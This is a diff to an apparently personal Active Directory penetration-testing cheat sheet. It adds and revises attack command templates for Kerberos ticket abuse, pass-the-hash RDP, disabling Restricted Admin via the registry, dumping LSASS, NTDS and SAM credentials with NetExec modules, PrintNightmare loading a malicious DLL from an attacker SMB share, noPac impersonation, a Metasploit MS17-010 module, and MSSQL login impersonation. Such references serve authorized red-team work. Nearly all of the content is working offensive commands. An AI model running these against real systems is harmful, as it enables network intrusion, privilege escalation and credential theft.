@@ -1,5 +1,9 @@
 # Active Directory
 *   [Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/)
+*   [KB Realm Configuration](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
+    *   `addhost [IP] [DOMAIN]` → `addhost [IP] [DC_HOSTNAME]` → Repeat for every domain
+    *   `krbconf()     [DOMAIN] [DC_NETBIOS_NAME]`                     → [Add Multiple Domains](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
+    *   `sudo rdate -n [DC_HOSTNAME]` 
 *   Authentication
     *   Password
         *   NXC           → `-u [USER] -p [PASS] -d [DOMAIN] [--local-auth]` → Add `-k` if `STATUS_NOT_SUPPORTED` 
@@ -15,18 +19,15 @@
         *   Password Conversion  → `iconv -f ASCII -t UTF-16LE <(printf "[PASS]") | openssl dgst -md4`
         *   Cracking                          → `hashcat -m 1000`
         *   Export Ticket                  → Impersonate Service Administrator + [SPN Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#abusing-service-tickets)
-    *   Kerberos (TGT / PFX / TGS)
-        *   Request                   → `getTGT.py [AUTH_STRING]` → `export KRB5CCNAME=[TICKET.ccache]`
-        *   NXC                           → `--kdcHost [DC_FQDN] --use-kcache -d [DOMAIN] [--local-auth]` 
-        *   Impacket                 → `[DOMAIN]/[USER]@[IP] -k -no-pass`
-        *   Win/Lin Convert    → `ticketConverter.py [KIRBI/CCACHE_IN] [KIRBI/CCACHE_OUT]`
-        *   [KB Realm Configuration](https://mayfly277.github.io/posts/GOADv2-pwning_part1/)
-            *   `addhost [IP] [DOMAIN]` → `addhost [IP] [DC_HOSTNAME]`
-            *   `configure_krb5.py [DOMAIN] [DC_NETBIOS_NAME]`
-            *   `sudo rdate -n [DC_IP]` 
+    *   KB Tickets
+        *   Load Ticket              → `export KRB5CCNAME=[TICKET.ccache]`
+        *   NXC                            → `--kdcHost [DC_FQDN] --use-kcache -d [DOMAIN] [--local-auth]` 
+        *   Impacket                  → `[DOMAIN]/[USER]@[IP] -k -no-pass`
+        *   Win/Lin Convert     → `ticketConverter.py [KIRBI/CCACHE_IN] [KIRBI/CCACHE_OUT]`
+        *   Ticket Request       → `getTGT.py [AUTH_STRING]`
     *   RDP
         *   `xfreerdp /u:[USER] /p:'[PASS]' /v:[IP] [/pth:HASH] [--local-auth] +clipboard` 
-        *   RDP NTLM               → `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
+        *   Enable NTLM          → `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
         *   RDP Group              → `net localgroup "Remote Desktop Users" [USER] /add`
     *   WinRM
         *   `evil-winrm -i [IP] -u [USER] [-p/H] [PASS/HASH]`  → Check `menu` + Commands
@@ -39,7 +40,7 @@
         *   `nxc [IP] [AUTH_STRING] -x [CMD]`
         *   `nxc [IP] [AUTH_STRING] -X [PS_COMMAND] [--amsi-bypass /PATH/TO/PAYLOAD]`
     *   Hash Dumping
-        *   `nxc smb [IP] [AUTH_STRING] -M lsassy -M nanodump`
+        *   `nxc smb [IP] [AUTH_STRING] -M lsassy -M nanodump -M ntdsutil`
         *   `nxc smb [IP] [AUTH_STRING] --lsa --dpapi --sam --ntds`
         *   `nxc smb [IP] [AUTH_STRING] --sccm [disk/wmi]`
         *   `nxc smb [IP] [AUTH_STRING] -M wifi -M keepass_discover -M veeam -M winscp -M vnc -M mremoteng -M rdcman -M teams_localdb -M security-questions`
@@ -89,12 +90,14 @@
         *   `nxc smb  [IP] [AUTH_STRING] -M gpp_password`
         *   `nxc smb  [IP] [AUTH_STRING] --laps`
         *   `nxc ldap [DC_IP] [AUTH_STRING] --gmsa`
-    *   DC Exploits
-        *   `nxc smb [IP] [AUTH_STRING] -M printnightmare -M zerologon -M nopac -M smbghost -M ms17-010`
-        *   [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675.git) → `CVE-2021-1675.py [AUTH_STRING] '\\[YOUR_SMB_IP]\[SHARE]\[SHELL.dll]'`
+    *   SMB Exploits
+        *   `scan() smb [IP] [PORT]` → Exploit Research
+        *   `nxc smb [IP] [AUTH_STRING] -M printnightmare -M spooler -M zerologon -M nopac -M smbghost -M ms17-010`
+        *   [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675.git) → `CVE-2021-1675.py [AUTH_STRING] '\\[KALI_IP]\Share\[EVIL.dll]'` → MSFVenom / [AddUser Cross-Compile](https://github.com/newsoft/adduser)
         *   [NoPAC](https://github.com/Ridter/noPac.git)                  → `noPac.py [AUTH_STRING] --impersonate administrator -use-ldap -dump`
+        *   MS17-010                → `use exploit/windows/smb/ms17_010_psexec`
         *   [ZeroLogon](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/ZeroLogon/)
-        *   SMBGhost / MS17-010 / SMB Vulnerabilities
+        *   SMBGhost
     *   NTLM Poisoning
         *   LLMNR
             *   `respond()`
@@ -198,6 +201,7 @@
     *   `mssqclient.py [AUTH_STRING] [-windows-auth]`
     *   User Permissions
         *   `SELECT * FROM fn_my_permissions(NULL, 'SERVER');`
+        *   `SELECT IS_SRVROLEMEMBER ('sysadmin');`
         *   Check Admin / Read / Write / Directives
     *   DB Dumping
         *   `enum_db` → `use [DB_NAME]`
@@ -214,7 +218,7 @@
             *   `nxc mssql [IP] [AUTH_STRING] -q '[MSSQL_QUERY]'`
         *   Manual
             *   `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
-            *   `EXECUTE AS LOGIN = ‘[PRIVILEGED_USER]’`
+            *   `EXECUTE AS LOGIN = '[PRIVILEGED_USER]'`
     *   OS Read / Upload
         *   Download              → `nxc mssql [IP] [AUTH_STRING] --get-file C:\\[SRC] [OUT]`
         *   Upload                    → `nxc mssql [IP] [AUTH_STRING] --put-file [SRC] C:\\Windows\\Temp\\[OUT]`
